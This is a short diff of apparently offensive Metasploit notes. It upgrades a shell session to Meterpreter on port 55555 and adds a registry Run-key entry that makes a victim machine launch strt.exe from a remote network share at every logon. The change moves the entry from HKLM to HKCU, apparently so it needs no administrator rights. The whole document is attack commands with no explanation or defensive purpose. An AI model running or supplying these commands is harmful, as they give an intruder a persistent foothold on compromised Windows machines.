@@ -7,4 +7,4 @@ exploit
 use multi/manage/shell_to_meterpreter
 set LPORT 55555
 set SESSION ..
-reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v boi -t REG_SZ -d \\\\farnsworth\\EDB15\\strt.exe
+reg setval -k HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v boi -t REG_SZ -d \\\\farnsworth\\EDB15\\strt.exe
